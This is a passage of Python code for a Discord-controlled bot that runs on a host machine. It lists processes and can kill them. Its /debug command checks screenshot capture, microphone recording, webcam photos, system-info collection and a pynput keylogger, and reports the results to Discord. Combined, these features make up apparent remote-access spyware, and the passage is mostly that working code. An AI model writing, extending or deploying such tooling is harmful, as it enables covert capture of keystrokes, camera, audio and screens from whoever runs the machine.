            await interaction.followup.send(f"🔍 No processes found matching {search_term}.")
            return
        
        # Format results table
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Table header
        table_text = "```"
        table_text += f"{'PID':<8} {'NAME':<16} {'USER':<12} {'CPU%':<6} {'MEM_MB':<8} {'UPTIME':<8} {'CMD':<20}\n"
        table_text += "-" * 80 + "\n"
        
        # Show up to 10 processes in the preview
        for proc in processes[:10]:
            proc_name = proc['name'][:15] if len(proc['name']) > 15 else proc['name']
            username = proc['username'][:11] if len(proc['username']) > 11 else proc['username']  
            cmdline = proc['cmdline'][:19] if len(proc['cmdline']) > 19 else proc['cmdline']
            
            table_text += f"{proc['pid']:<8} {proc_name:<16} {username:<12} {proc['cpu_percent']:<6.1f} {proc['memory_mb']:<8.1f} {proc['uptime']:<8} {cmdline:<20}\n"
        
        table_text += "```"
        
        search_term = f"PID {pid}" if pid is not None else f"name '{name}'"
        response_text = f"🔍 **Found {len(processes)} process{'es' if len(processes) != 1 else ''}** matching {search_term}\n"
        response_text += f"**Sorted by**: {sort_criteria}\n\n{table_text}"
        
        if len(processes) > 10:
            response_text += f"\n... and {len(processes) - 10} more processes (see attachment)"
            
            # Create CSV attachment for full results
            csv_filename = f"processes_{timestamp}.csv"
            with open(csv_filename, 'w', encoding='utf-8') as f:
                f.write("PID,NAME,USER,CPU%,MEM_MB,UPTIME,CMD\n")
                for proc in processes:
                    f.write(f"{proc['pid']},{proc['name']},{proc['username']},{proc['cpu_percent']:.1f},{proc['memory_mb']:.1f},{proc['uptime']},{proc['cmdline']}\n")
            
            await interaction.followup.send(
                response_text,
                file=discord.File(csv_filename),
            )
            
            # Clean up
            os.remove(csv_filename)
        else:
            await interaction.followup.send(response_text)
        
    except Exception as e:
        logger.error(f"Error in find-process command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error searching processes: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error searching processes: {str(e)}", ephemeral=True)
        except Exception:
            pass


@bot.tree.command(name='kill', description='Terminate a process by PID (recommended) or name, with safety checks')
@discord.app_commands.describe(
    pid='Process ID to terminate (recommended - use /find-process first)',
    name='Process name to terminate (only if PID not provided)',
    signal='Signal type to send to the process',
    force='If TERM fails, automatically escalate to KILL after 3 seconds'
)
@discord.app_commands.choices(signal=[
    discord.app_commands.Choice(name='SIGTERM (graceful)', value='TERM'),
    discord.app_commands.Choice(name='SIGKILL (force)', value='KILL')
])
async def kill_process(interaction: discord.Interaction, pid: int = None, name: str = None,
                      signal: discord.app_commands.Choice[str] = None, force: bool = False):
    try:
        # Authorization check
        guild_owner_id = interaction.guild.owner_id if interaction.guild else interaction.user.id
        if not is_authorized_user(interaction.user.id, guild_owner_id):
            await interaction.response.send_message(
                "❌ You are not authorized to use /kill.", 
            )
            return
        
        await interaction.response.defer(thinking=True)
        
        # Validate parameters
        if not pid and not name:
            await interaction.followup.send(
                "❌ Please provide either a PID or process name. Use `/find-process` to find the target process first.",
            )
            return
        
        # Set defaults
        signal_type = signal.value if signal else 'TERM'
        
        # Perform termination
        result = await terminate_process_async(
            pid=pid,
            name=name,
            signal_type=signal_type,
            force=force
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ {result['error']}", ephemeral=True)
        elif 'success' in result:
            await interaction.followup.send(f"✅ {result['success']}", ephemeral=True)
        else:
            await interaction.followup.send("❌ Unknown error occurred during termination.", ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in kill command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error terminating process: {str(e)}", ephemeral=True)
            else:
                await interaction.followup.send(f"❌ Error terminating process: {str(e)}", ephemeral=True)
        except Exception:
            pass

@bot.tree.command(name='debug', description='Test all system functions')
async def debug(interaction: discord.Interaction):
    await interaction.response.defer()
    results = []
    # ss test
    try:
        path = take_screenshot()
        results.append('🟢 Screenshot: OK')
        os.remove(path)
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Screenshot: FAIL\n{str(e)}\n```{tb}```')
    # audio test
    try:
        path = record_audio(duration=1)
        results.append('🟢 Audio Recording: OK')
        os.remove(path)
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Audio Recording: FAIL\n{str(e)}\n```{tb}```')
    # cam test
    try:
        path = take_webcam_photo()
        if path:
            results.append('🟢 Camera: OK')
            os.remove(path)
        else:
            results.append('🔴 Camera: FAIL\nNo photo captured (device not found or permission denied)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Camera: FAIL\n{str(e)}\n```{tb}```')
    # sys info test
    try:
        info = get_system_info()
        results.append('🟢 System Info: OK')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 System Info: FAIL\n{str(e)}\n```{tb}```')
    # Keylogger test (jst checking import, listener)
    try:
        from pynput import keyboard
        results.append('🟢 Keylogger: OK (import)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Keylogger: FAIL\n{str(e)}\n```{tb}```')
    await interaction.followup.send('\n'.join(results))

# run the bot
logger.info('Starting bot...')
bot.run(TOKEN) 